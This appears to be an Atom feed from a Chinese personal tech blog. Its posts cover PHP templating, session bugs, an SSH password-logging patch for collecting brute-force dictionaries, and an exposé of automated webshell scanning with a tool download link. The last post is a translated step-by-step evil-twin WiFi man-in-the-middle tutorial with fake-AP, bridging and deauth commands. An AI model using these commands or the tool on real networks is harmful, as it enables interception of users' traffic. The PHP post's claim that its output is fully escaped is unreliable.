    <id>http://lurrpis.com/32.html</id>
    <published>2015-04-28T00:12:14.000Z</published>
    <updated>2015-04-28T00:21:48.180Z</updated>
    <content type="html"><![CDATA[<p>仅对自己说，不要乱了阵脚。<br>每日7点起，奋斗。<br>青春，就这十年。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>仅对自己说，不要乱了阵脚。<br>每日7点起，奋斗。<br>青春，就这十年。</p>
]]>
    </summary>
    
      <category term="日志" scheme="http://lurrpis.com/tags/%E6%97%A5%E5%BF%97/"/>
    
      <category term="eassy" scheme="http://lurrpis.com/categories/eassy/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[5行代码顶替Smarty，PHP渲染函数]]></title>
    <link href="http://lurrpis.com/31.html"/>
    <id>http://lurrpis.com/31.html</id>
    <published>2015-04-23T13:42:03.000Z</published>
    <updated>2015-04-23T14:28:14.066Z</updated>
    <content type="html"><![CDATA[<h4 id="前言">前言</h4><p>经常遇到“做些不大不小的项目，懒得用框架，但不用又在某些特殊部位增加很多工作量”的场景，尤其是在没有渲染模板下使用Ajax刷新页面，往往是一大堆JS操作DOM实现页面更新，想做好用户体验却又费时又费力，今天就在爆栈上找到一个自认为很经典又实用的函数(才疏学浅，勿喷)，推荐它主要是因为<code>extract</code>和<code>ob_start</code>配合很少见到(别为自己无知找借口了T^T)，上代码。</p>
<h4 id="Render函数">Render函数</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">(<span class="variable">$template</span>, <span class="variable">$param</span>=null)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$param</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$param</span>))</span><br><span class="line">        extract(<span class="variable">$param</span>);</span><br><span class="line">    ob_start();</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$template</span>;</span><br><span class="line">    <span class="keyword">return</span> ob_get_clean();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="使用方法">使用方法</h4><p>使用很简单，大家应该一看就懂，还是啰嗦举个栗子<br>例如一个Ajax返回:<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span> = [</span><br><span class="line">	<span class="string">'success'</span>=&gt;<span class="keyword">true</span>,</span><br><span class="line">	<span class="string">'page'</span>=&gt;Main::render(APP_ROOT.<span class="string">'/views/table.php'</span>,<span class="keyword">array</span>(<span class="string">'data'</span>=&gt;<span class="variable">$data</span>));</span><br><span class="line">];</span><br><span class="line"><span class="keyword">echo</span> json_encode(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure></p>
<p><code>table.php</code>中<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">各种html+js+css随便写</span><br><span class="line">&lt;p&gt;</span><br><span class="line">SHIT，直接用原生PHP就可以解析好伐？</span><br><span class="line">DATA:<span class="preprocessor">&lt;?php</span> print_r(<span class="variable">$data</span>); <span class="preprocessor">?&gt;</span></span><br><span class="line">&lt;/p&gt;</span><br></pre></td></tr></table></figure></p>
<h4 id="最后">最后</h4><p>这几行代码，就已把数据渲染并且全部转义了有木有，<br>JSON编码简直无压力，传回JS，然后一个<code>$(&quot;#what&quot;).html(data[&#39;page&#39;])</code>，<br>简直完爆几百行JS啊，这么短小精悍，各种视图渲染框架都蹲在墙角不说话。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h4 id="前言">前言</h4><p>经常遇到“做些不大不小的项目，懒得用框架，但不用又在某些特殊部位增加很多工作量”的场景，尤其是在没有渲染模板下使用Ajax刷新页面，往往是一大堆JS操作DOM实现页面更新，想做好用户体验却又费时又费力，今天就在爆栈上找到一个自认为很经典]]>
    </summary>
    
      <category term="HTML转为JSON" scheme="http://lurrpis.com/tags/HTML%E8%BD%AC%E4%B8%BAJSON/"/>
    
      <category term="PHP Render" scheme="http://lurrpis.com/tags/PHP-Render/"/>
    
      <category term="PHP无框架渲染" scheme="http://lurrpis.com/tags/PHP%E6%97%A0%E6%A1%86%E6%9E%B6%E6%B8%B2%E6%9F%93/"/>
    
      <category term="code" scheme="http://lurrpis.com/categories/code/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[ThinkPHP 验证码SESSION不正确，值为空，解决办法]]></title>
    <link href="http://lurrpis.com/30.html"/>
    <id>http://lurrpis.com/30.html</id>
    <published>2015-04-16T07:56:14.000Z</published>
    <updated>2015-04-16T09:03:45.939Z</updated>
    <content type="html"><![CDATA[<h4 id="前言">前言</h4><blockquote>
<p>其实这个问题的出现和ThinkPHP毫无关系，问题定位错了，自然有很多人苦于找不到解决方法。问题是出现在目前正在着手处理的众筹平台项目<code>美事儿 mser.cn</code>上，在本地开发基础版本后，上传服务器调试发现后台一直无法登陆，DEBUG发现<code>es_session::get(&#39;verify&#39;)</code>为空值，起初以为是ThinkPHP的问题，跟换<code>$_SESSION</code>后，依然为空值，就此确定是系统环境的问题。</p>
</blockquote>
<h4 id="确定问题">确定问题</h4><p>首先确定<code>SESSION</code>是否仅跨页无法获取，写俩php。<br><strong>t1.php</strong><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">'METEST'</span>]=<span class="string">'我在这里'</span>;</span><br><span class="line"><span class="variable">$url</span>=<span class="string">"&lt;a href='/s2.php'&gt;下一页&lt;/a&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$url</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"本页SESSION:"</span>.<span class="variable">$_SESSION</span>[<span class="string">'METEST'</span>];</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><strong>t2.php</strong><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"传递SESSION值为:"</span>.<span class="variable">$_SESSION</span>[<span class="string">'METEST'</span>];</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>若<code>本页SESSION</code>都为空值，就请百度<code>PHP环境中如何开启SESSION</code>，若本页有值，下一页为空值，请继续往下看。</p>
<h4 id="解决方法">解决方法</h4><p>还是出于<strong>懒!</strong>，懒得思考，直接去抱度娘古哥大腿，发现大部分答的都是文不对题，习惯性按照各种回答都尝试了一遍，无果。。因此也因为<strong>懒</strong>浪费了很多时间，不费话了。</p>
<p>打印<code>phpinfo()</code>，认真检查<code>session.save_path</code>是否开启了读写权限，我就是太迷信<code>php.ini</code>中<code>session.save_path</code>设置为了<code>/tmp</code>,而真实环境中加载的却是<code>/var/lib/php/session</code><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod <span class="number">775</span> -R /var/lib/php/session</span><br></pre></td></tr></table></figure></p>
<p>就解决了SESSION为空值的问题。</p>
<h4 id="若依然不行">若依然不行</h4><p>打印<code>phpinfo</code>，检查session.use_trans_sid是否开启，开启办法：<br><strong>php.ini设置</strong><br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">session<span class="class">.use_trans_sid</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p>或<br><strong>代码中申明</strong><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ini_set(<span class="string">'session.use_trans_sid'</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure></p>
<h4 id="最后">最后</h4><blockquote class="blockquote-center">不想走弯路<br>还是不要<strong>懒</strong><br>搜索之前过下脑</blockquote>

]]></content>
    <summary type="html">
    <![CDATA[<h4 id="前言">前言</h4><blockquote>
<p>其实这个问题的出现和ThinkPHP毫无关系，问题定位错了，自然有很多人苦于找不到解决方法。问题是出现在目前正在着手处理的众筹平台项目<code>美事儿 mser.cn</code>上，在本地开发基础版本后，上]]>
    </summary>
    
      <category term="SESSION无法跨页面" scheme="http://lurrpis.com/tags/SESSION%E6%97%A0%E6%B3%95%E8%B7%A8%E9%A1%B5%E9%9D%A2/"/>
    
      <category term="ThinkPHP获取不到SESSION" scheme="http://lurrpis.com/tags/ThinkPHP%E8%8E%B7%E5%8F%96%E4%B8%8D%E5%88%B0SESSION/"/>
    
      <category term="ThinkPHP验证码一直错误" scheme="http://lurrpis.com/tags/ThinkPHP%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%80%E7%9B%B4%E9%94%99%E8%AF%AF/"/>
    
      <category term="code" scheme="http://lurrpis.com/categories/code/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[随便写写]]></title>
    <link href="http://lurrpis.com/29.html"/>
    <id>http://lurrpis.com/29.html</id>
    <published>2015-04-16T07:05:10.000Z</published>
    <updated>2015-04-16T07:18:10.446Z</updated>
    <content type="html"><![CDATA[<p>有几天没有更新博客了，这段时间一直在忙新项目的事情，微思敦的内容管理系统成功上线后，暂时有了点空闲时间，着手开发之前讨论了很久的众筹平台<code>美事儿 mser.cn</code>，虽然不是很看好这个项目，不过也算在茫茫的创业大军中插上一脚，不要掉队把，争取通过这个项目，组建一支小而精的开发团队，互相磨合，在机会真正降临时，能够一把抓住。</p>
<blockquote class="blockquote-center">毕竟<br>梦想还是要折腾的<br>万一实现了呢</blockquote>
]]></content>
    <summary type="html">
    <![CDATA[<p>有几天没有更新博客了，这段时间一直在忙新项目的事情，微思敦的内容管理系统成功上线后，暂时有了点空闲时间，着手开发之前讨论了很久的众筹平台<code>美事儿 mser.cn</code>，虽然不是很看好这个项目，不过也算在茫茫的创业大军中插上一脚，不要掉队把，争取通过这个项目]]>
    </summary>
    
      <category term="随笔" scheme="http://lurrpis.com/tags/%E9%9A%8F%E7%AC%94/"/>
    
      <category term="essay" scheme="http://lurrpis.com/categories/essay/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[黑色产业链:自动批量SHELL一条龙]]></title>
    <link href="http://lurrpis.com/28.html"/>
    <id>http://lurrpis.com/28.html</id>
    <published>2015-04-07T01:41:47.000Z</published>
    <updated>2015-05-24T01:21:06.052Z</updated>
    <content type="html"><![CDATA[<p>我偶然接触黑产冰山一角，得知黑产的发展比我们想象还快，已经进化到全自动批量扫描SHELL一条龙，结合前辈揭露的，他们配合，从批量扫描到挂马到挂黑页等，一个傻瓜按钮就完成。我们看看以前，下发命令实现全自动发布广告，再结合现在的批量SHELL，很多中小网站都中标，我揭露的只是他们利用网上已公布的CMS漏洞来写的一些批量工具，这还只是公布的一个漏洞，CMS那么多漏洞，如果都被利用了，想想都可怕。</p>
<p>URL自动采集、CMS自动识别：<br><img src="http://static.blog.lurrpis.com/shell1.png" alt="shell"><br>DEDE自动扫描上传shell爆密码：<br><img src="http://static.blog.lurrpis.com/shell2.png" alt="shell"><br><img src="http://static.blog.lurrpis.com/shell3.png" alt="shell"><br>原以为这4000多shell可能要自己一个个去试，也想过可能有类似的脚本，但是没想到他们已先一步自动了，</p>
<p>只需把扫出来的<code>shell</code> <code>CRTL+C</code> <code>CRTL+V</code>就可以自动测试，而且速度还挺快，分类还挺详细：<br><img src="http://static.blog.lurrpis.com/shell4.png" alt="shell"><br><img src="http://static.blog.lurrpis.com/shell5.png" alt="shell"><br><img src="http://static.blog.lurrpis.com/shell6.png" alt="shell"><br>测试了一下就有4000多shell，用一句话测试脚本跑了下，跑了700多条，成功26条，用时半个小时。<br><img src="http://static.blog.lurrpis.com/shell7.png" alt="shell"><br><img src="http://static.blog.lurrpis.com/shell8.png" alt="shell"><br>最新SEO shell工具，用于灰帽SEO<br><img src="http://static.blog.lurrpis.com/shell9.png" alt="shell"><br>最影响深刻一句话是:我前段时间被骗5W多条SHELL，但是没事，有技术，不怕骗。<br>可能说出这句话的人不怎么了解这个数字会对一些做安全的人是怎样一个冲击，但是我深深知道，这影响太大了，5W条SHELL，</p>
<p>还是能成功连接的，这如果被不法分子掌握，将会是一种什么样的灾难。</p>
<p>根据前方战地记者了解，这只是他们根据公布的DEDE漏洞写的几个工具而已。他们还有更多我们不知道的自动化，当然碍于各种原因，</p>
<p>我无从得知。虽然可能现在大型网站都是定制开发，但是普遍的还是中小型，想想我们以后百度一下，都是黑产挂的一些东西，</p>
<p>那网络环境可得糟糕。希望借此篇让更多人了解安全的重要性，不然前期做的再多，再好都是为了不法之徒养好孩子而已。</p>
<p><code>v5.0服务器URL采集CMS识别MYSQL版本</code><br>下载地址<br><a href="http://pan.baidu.com/s/1dDF77hB" target="_blank" rel="external">http://pan.baidu.com/s/1dDF77hB</a><br>密码<code>tp3g</code></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>我偶然接触黑产冰山一角，得知黑产的发展比我们想象还快，已经进化到全自动批量扫描SHELL一条龙，结合前辈揭露的，他们配合，从批量扫描到挂马到挂黑页等，一个傻瓜按钮就完成。我们看看以前，下发命令实现全自动发布广告，再结合现在的批量SHELL，很多中小网站都中标，我揭露的只是他]]>
    </summary>
    
      <category term="SHELL批量扫描" scheme="http://lurrpis.com/tags/SHELL%E6%89%B9%E9%87%8F%E6%89%AB%E6%8F%8F/"/>
    
      <category term="黑色产业链" scheme="http://lurrpis.com/tags/%E9%BB%91%E8%89%B2%E4%BA%A7%E4%B8%9A%E9%93%BE/"/>
    
      <category term="code" scheme="http://lurrpis.com/categories/code/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[OS X Yosemite 10.10.2 WiFi速度慢，断线问题解决办法]]></title>
    <link href="http://lurrpis.com/26.html"/>
    <id>http://lurrpis.com/26.html</id>
    <published>2015-03-28T10:23:33.000Z</published>
    <updated>2015-03-28T11:46:04.344Z</updated>
    <content type="html"><![CDATA[<h5 id="前言">前言</h5><blockquote>
<p>由于目前租房的接入网络是<code>长城宽带</code>，在问题发现根源之前一直以为是长城宽带不给力，最后发现原来是Yosemite系统下蓝牙引发的鸡肋问题。</p>
</blockquote>
<h5 id="问题描述">问题描述</h5><p>Pro上网时速度奇慢无比，但同一网络下的平板和手机同时看视频都没有压力，由于问题常在周末发生，一是在抱怨长城宽带，二是怀疑路由器兼容有问题，期间还花费150大洋把Tenda换成TPlink，刚换上神奇的发现网速竟然回归正常，高兴了许久，但没过多少时间，网速又偶尔变成龟速，有时竟然连网关都无法Ping通。</p>
<h5 id="问题解决">问题解决</h5><p>今天实在忍!不!了!了!这渣网速，去挖掘了下问题的根源，尝试网上提到的几种方法依然无效，最后无奈之下，想起查找问题时有人在其评论中一带而过的<code>蓝牙影响WiFi</code>，因为一直用的蓝牙键鼠，方便携带，最终难以取舍下关闭蓝牙，重新连接Wifi，惊奇的发现，网速竟然恢复正常，又重新打开蓝牙，再次联网，网速又回归龟速，再次尝试先关闭蓝牙，再连接Wifi，再打开蓝牙，这时，网速和蓝牙都回归正常。</p>
<p>多次测试之后，证实必须先连接Wifi，再连接蓝牙，网速才能回归正常。但在公司没有遇到过类似问题，此问题只在家里重现，不过没有关系，网络龟速问题已经解决(至于是否跟路由相关，我真的懒得折腾，要求不高，让我能安心上个网就谢天谢地了。原来之前老觉着周末网速慢都是自己骗自己，也吐槽了不少遍长宽的种种，因为只在周末用蓝牙，我不会告诉你是因为我平时懒得把鼠标从包里拿出来)</p>
<h5 id="最后">最后</h5><p>委屈冤枉了<code>长城宽带</code>，其实它有时还蛮快的。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h5 id="前言">前言</h5><blockquote>
<p>由于目前租房的接入网络是<code>长城宽带</code>，在问题发现根源之前一直以为是长城宽带不给力，最后发现原来是Yosemite系统下蓝牙引发的鸡肋问题。</p>
</blockquote>
<h5 id]]>
    </summary>
    
      <category term="Wifi掉线" scheme="http://lurrpis.com/tags/Wifi%E6%8E%89%E7%BA%BF/"/>
    
      <category term="Yosemite" scheme="http://lurrpis.com/tags/Yosemite/"/>
    
      <category term="网速慢" scheme="http://lurrpis.com/tags/%E7%BD%91%E9%80%9F%E6%85%A2/"/>
    
      <category term="code" scheme="http://lurrpis.com/categories/code/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[运维小技巧:为你的SSH添加被爆破记录]]></title>
    <link href="http://lurrpis.com/23.html"/>
    <id>http://lurrpis.com/23.html</id>
    <published>2015-03-25T07:34:47.000Z</published>
    <updated>2015-03-25T07:58:12.067Z</updated>
    <content type="html"><![CDATA[<h3 id="前言">前言</h3><blockquote>
<p>默认的ssh日志是不带密码记录功能的，现在想把登录密码记录下来，这样就可以搜集黑客的ssh爆破的字典了。具体操作就是给默认的ssh代码增加一个patch。</p>
</blockquote>
<h3 id="操作">操作</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://openbsd.cs.toronto.edu/pub/OpenBSD/OpenSSH/portable/openssh-<span class="number">6.6</span>p1.tar.gz</span><br><span class="line">tar xzvf openssh-<span class="number">6.6</span>p1.tar.gz</span><br><span class="line"><span class="built_in">cd</span> openssh-<span class="number">6.6</span>p1</span><br></pre></td></tr></table></figure>
<p>在当前目录下新建一个patch文件<code>sshlog.patch</code>，代码如下：<br><figure class="highlight nimrod"><table><tr><td class="code"><pre><span class="line">--- auth-passwd.c       <span class="number">2012</span>-<span class="number">04</span>-<span class="number">25</span> <span class="number">19</span>:<span class="number">51</span>:<span class="number">28</span>.<span class="number">000000000</span> -<span class="number">0400</span></span><br><span class="line">+++ auth-passwd-sshlog.c        <span class="number">2014</span>-<span class="number">02</span>-<span class="number">11</span> <span class="number">12</span>:<span class="number">19</span>:<span class="number">42</span>.<span class="number">000000000</span> -<span class="number">0500</span></span><br><span class="line">@@ -<span class="number">82</span>,<span class="number">6</span> +<span class="number">82</span>,<span class="number">7</span> @@</span><br><span class="line"> &#123;</span><br><span class="line">        struct passwd * pw = authctxt-&gt;pw;</span><br><span class="line">        <span class="type">int</span> <span class="literal">result</span>, ok = authctxt-&gt;valid;</span><br><span class="line">+    logit(<span class="string">"sshlog: %s %s"</span>, authctxt-&gt;user, password);</span><br><span class="line"> <span class="comment">#if defined(USE_SHADOW) &amp;&amp; defined(HAS_SHADOW_EXPIRE)</span></span><br><span class="line">        <span class="keyword">static</span> <span class="type">int</span> expire_checked = <span class="number">0</span>;</span><br><span class="line"> <span class="comment">#endif</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">patch --dry-run &lt; sshlog.patch</span><br><span class="line">patch  &lt; sshlog.patch</span><br></pre></td></tr></table></figure>
<p>备份之前的ssh配置文件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mv /etc/ssh/ /etc/ssh_old</span><br><span class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --without-zlib-version-check  --with-md5-passwords --mandir=/usr/share/man</span><br><span class="line">/etc/init.d/sshd restart</span><br></pre></td></tr></table></figure></p>
<h3 id="演示">演示</h3><p>SSH爆破时候的密码会被记录在<code>/var/log/messages</code>里<br>可以看到此时服务器还在被爆破着。。。<br><img src="http://static.blog.lurrpis.com/file0001.jpg" alt="ssh"><br>通过<code>d3.js</code>可以图形化爆破的次数更直观（以下服务器7天内被爆破的次数）<br><img src="http://static.blog.lurrpis.com/2.jpg" alt="ssh"></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="前言">前言</h3><blockquote>
<p>默认的ssh日志是不带密码记录功能的，现在想把登录密码记录下来，这样就可以搜集黑客的ssh爆破的字典了。具体操作就是给默认的ssh代码增加一个patch。</p>
</blockquote>
<h3 id="操]]>
    </summary>
    
      <category term="SSH安全记录" scheme="http://lurrpis.com/tags/SSH%E5%AE%89%E5%85%A8%E8%AE%B0%E5%BD%95/"/>
    
      <category term="添加SSH日志" scheme="http://lurrpis.com/tags/%E6%B7%BB%E5%8A%A0SSH%E6%97%A5%E5%BF%97/"/>
    
      <category term="code" scheme="http://lurrpis.com/categories/code/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[检测你的Xcode中是否有CIA的后门]]></title>
    <link href="http://lurrpis.com/21.html"/>
    <id>http://lurrpis.com/21.html</id>
    <published>2015-03-23T09:10:13.000Z</published>
    <updated>2015-03-23T09:18:41.000Z</updated>
    <content type="html"><![CDATA[<p>根据斯诺登近期爆料的文件显示，CIA在美国桑迪亚Sandia国家实验室开发了一款流氓版Xcode。这个版本的Xcode会在苹果开发者的电脑中植入后门，窃取他们的个人开发密钥<code>private codesign key</code>。</p>
<p><img src="http://static.blog.lurrpis.com/1.png" alt="CIA后门"></p>
<p>那么如何检测这个后门呢？我们可以通过检测被这个后门所篡改的安全机制是否能正确的运行来验证。根据斯诺登披露的文件，该后门篡改了securityd守护进程，使得在导出开发者密钥的时候并不向用户发出警告。</p>
<blockquote>
<p><strong>后门重写了securityd，使在导出开发者密钥的时候并不向用户弹出警告</strong></p>
</blockquote>
<p>所以最好的测试方法就是试着导出你的开发者密钥，看看securityd会不会发出警告，以获取你的同意。</p>
<p>根据这篇文章，你会知道如何导出个人密钥：</p>
<ol>
<li>在<code>Xcode Preference</code>窗口中，单击<code>Accounts</code></li>
<li>点击做下角的<code>Action</code>按钮（在minus按钮的右边）</li>
<li>在弹出窗口中选择<code>Export Accounts</code></li>
</ol>
<p>此时，securityd应该弹出一个窗口，询问你是否允许导出你的密钥。</p>
<p><img src="http://static.blog.lurrpis.com/2.png" alt="CIA后门"></p>
<p>如果你没有看到弹出窗口，那你很可能就中招了，后门会在你不知情的情况下导出你的密钥。</p>
<p>因为我们并没有拿到这款据称由CIA篡改的Xcode，所以我们并不能肯定该方法一定有效。但根据曝出的幻灯片中的信息，起码在特定情况下，这种检测是有效的。</p>
<p>[via@<a href="http://bobao.360.cn/news/detail/1302.html" target="_blank">360bobao</a>]</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>根据斯诺登近期爆料的文件显示，CIA在美国桑迪亚Sandia国家实验室开发了一款流氓版Xcode。这个版本的Xcode会在苹果开发者的电脑中植入后门，窃取他们的个人开发密钥<code>private codesign key</code>。</p>
<p><img src=]]>
    </summary>
    
      <category term="斯诺登" scheme="http://lurrpis.com/tags/%E6%96%AF%E8%AF%BA%E7%99%BB/"/>
    
      <category term="检测Xcode后门" scheme="http://lurrpis.com/tags/%E6%A3%80%E6%B5%8BXcode%E5%90%8E%E9%97%A8/"/>
    
      <category term="棱镜门" scheme="http://lurrpis.com/tags/%E6%A3%B1%E9%95%9C%E9%97%A8/"/>
    
      <category term="code" scheme="http://lurrpis.com/categories/code/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[3.15晚会黑客WiFi实现全教程，WiFi捕获和中间人攻击]]></title>
    <link href="http://lurrpis.com/20.html"/>
    <id>http://lurrpis.com/20.html</id>
    <published>2015-03-20T09:06:30.000Z</published>
    <updated>2015-05-24T01:21:05.621Z</updated>
    <content type="html"><![CDATA[<h4 id="前言">前言</h4><blockquote>
<p>先说明一下，这个文章不是我写的，是一个老外<code>Deepanshu Kapoor</code>安全专家写的，我一开始就是看着玩，但整个看完被老外那个细心和耐心给打动了，整个过程其实很简单，但是老外分了好多步骤来讲解，每个步骤都有配图和说明，甚至命令的参数都要解释一下。不得不佩服老外分享和奉献的精神，所以我也学着奉献一下，把它翻译成中文给大家看看吧，我尽量保持原汁原味，有不恰当的地方要原谅我，毕竟我不是专业翻译。（对原文PDF文档感兴趣的留邮箱，我发给你）</p>
</blockquote>
<h4 id="BT5_+_wireshark玩wifi数据包捕获和session注入(中间人攻击)">BT5 + wireshark玩wifi数据包捕获和session注入(中间人攻击)</h4><h4 id="介绍">介绍</h4><p>主要思路是通过伪造相同名称的wifi接入点，配合发送ARP数据包，攻击连入伪造wifi的用户。一个与原有wifi相同名称的伪造接入点一旦建立，会导致用户从原有链接中断开，并连入你所建立的伪造接入点中，因此所有的通信通道都会流经我的系统，届时我们通常会用session注入的方式拿到用户所有的细节/授信状态/信息等。</p>
<h4 id="必备神器">必备神器</h4><ol>
<li>BT5（Backtrack操作系统）</li>
<li>虚拟机（带USB设备）</li>
<li>可联网的主机</li>
</ol>
<h4 id="第一步">第一步</h4><p>开BT5的<code>terminal</code>终端，然后输入<code>iwconfig</code>检查无线网卡。<br><strong>说明：</strong><br><code>iwconfig</code>类似于<code>ifconfig</code>，但是是用于无线网络的。它经常被用来设置无线网卡的参数。<br><img src="http://static.blog.lurrpis.com/wifi1.png" alt="image"></p>
<h4 id="第二步">第二步</h4><p>输入<code>airmon-ng start wlan0</code>开启无线网卡。<br><strong>说明：</strong><br>这个命令可以被用来让无线网卡处于监听状态。也可以被用来从监听模式中恢复成管理模式。输入<code>airmon-ng</code>不带参数，可以显示网卡状态。<br><code>wlan0</code>是指wifi网卡。<br><code>wlan</code>是无线局域网， <code>0</code>是你的网卡编号。<br><img src="http://static.blog.lurrpis.com/wifi2.png" alt="image"></p>
<h4 id="第三步">第三步</h4><p>在网卡已经启动了监听模式后，输入<code>airodump-ng mon0</code>就可以开始抓包了。<br><strong>说明：</strong><br><code>airodump-ng</code>可以用来抓<code>802.11</code>的原始帧数据包，特别适合于收集WEP的初始化向量用于<code>aircrack-ng</code>的破解。<code>Airodump-ng</code>也能够用来记录找到的接入点的坐标。<br><code>mon0</code>在监听模式下和wlan0的意思是一样的。<br>一旦你把<code>wlan0</code>设置为<code>监听模式</code>，<code>wlan0</code>就要改为<code>mon0</code>。<br><img src="http://static.blog.lurrpis.com/wifi3.png" alt="image"></p>
<h4 id="第四步">第四步</h4><p>设置在<code>airodump-ng</code>中显示的频道ID，命令如下：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iwconfig mon0 channel <span class="number">5</span></span><br><span class="line">iwconfig wlan0 channel <span class="number">5</span></span><br></pre></td></tr></table></figure></p>
<p>或者<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iwconfig wlan0 channel <span class="number">5</span></span><br><span class="line">iwconfig mon0 channel <span class="number">5</span></span><br></pre></td></tr></table></figure></p>
<p><strong>说明：</strong><br>参数<code>channel</code>用来选定一个单独的特殊频道。<br><img src="http://static.blog.lurrpis.com/wifi4.png" alt="image"></p>
<h4 id="第五步">第五步</h4><p>现在开始建立你的伪造路由器，命令如下：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">airbase-ng - e <span class="string">"belkin.3448"</span> mon0</span><br></pre></td></tr></table></figure></p>
<p><strong>说明：</strong><br><code>airbase-ng</code>是个多用途的工具，可针对AP（接入点）自身的客户端进行攻击，主要的思路是驱使客户端去连接伪造的AP，不是阻止客户端去连接真实AP。<br><code>-e + SSID</code>指定伪造AP的<code>SSID</code>名称。<br><img src="http://static.blog.lurrpis.com/wifi5.png" alt="image"></p>
<h4 id="第六步">第六步</h4><p>现在是时候去<code>桥接</code>所有的网络了，命令如下：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brctl addbr mitm</span><br><span class="line">brctl addif mitm eth0</span><br><span class="line">brctl addif mitm at0</span><br></pre></td></tr></table></figure></p>
<p>中间人就是<code>&lt;interface name&gt;</code> 。<br>（这句话看原文直接翻译有些难以理解，实际上作者就是想说<code>at0</code>这个网卡架起来的网桥就是个中间人，攻击就是在这里完成的。—–译者注）</p>
<p><strong>说明：</strong><br><code>Brctl</code> 用来在两个网卡之间建立桥接网络。<br><code>Addbr</code> 用来添加网桥的对象，用<code>&lt;name&gt;</code>来指定网桥的名称。<br><code>Addif</code> 给已经使用<code>addbr</code>创建的网桥中添加一个网卡，后边的参数使用你要添加的网卡名称即可。<br><img src="http://static.blog.lurrpis.com/wifi6.png" alt="image"></p>
<h4 id="第七步">第七步</h4><p>现在创建一个新的网卡配置，命令如下：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ifconfig eth0 <span class="number">0.0</span>.<span class="number">0.0</span> up</span><br><span class="line">ifconfig at0 <span class="number">0.0</span>.<span class="number">0.0</span> up</span><br></pre></td></tr></table></figure></p>
<p><strong>说明：</strong><br><code>ifconfig</code>不用多说了，用来配置网卡，大家经常用的。<br><img src="http://static.blog.lurrpis.com/wifi7.png" alt="image"></p>
<h4 id="第八步">第八步</h4><p>现在可以启动我们用来做中间人攻击的网桥了！命令如下：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ifconfig mitm up</span><br></pre></td></tr></table></figure></p>
<p><strong>说明：</strong><br>配置完成的网桥可以使用<code>ifconfig</code>来启用。<br><img src="http://static.blog.lurrpis.com/wifi8.png" alt="image"></p>
<h4 id="第九步">第九步</h4><p>现在使用下面的命令发送认证包到路由器上，<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aireplay-ng - - deauth <span class="number">0</span> - a <span class="number">94</span>:<span class="number">44</span>:<span class="number">52</span>:DA:B4:<span class="number">28</span> mon0</span><br></pre></td></tr></table></figure></p>
<p><strong>说明：</strong><br><code>aireplay-ng</code>用来注入帧数据。<br><code>-a</code>指定被攻击者的<code>BSSID</code>。<br><code>94:44:52:DA:B4:28</code>这个是被攻击者的<code>BSSID</code>。<br><img src="http://static.blog.lurrpis.com/wifi9.png" alt="image"></p>
<h4 id="第十步">第十步</h4><p>现在开始给被攻击者分配IP，命令如下：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dhclient3 mitm&amp;</span><br></pre></td></tr></table></figure></p>
<p>或者<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dhclient3 mitm &amp;</span><br></pre></td></tr></table></figure></p>
<p><strong>说明：</strong><br>使用类似<code>DHCP</code>的协议方式分配<code>IP</code>。<br><img src="http://static.blog.lurrpis.com/wifi10.png" alt="image"></p>
<h4 id="第十一步">第十一步</h4><p>现在你可以看看是不是有客户端已经连接上了，有的话会显示在<code>第五步</code>的那个命令终端里面。<br><img src="http://static.blog.lurrpis.com/wifi11.png" alt="image"></p>
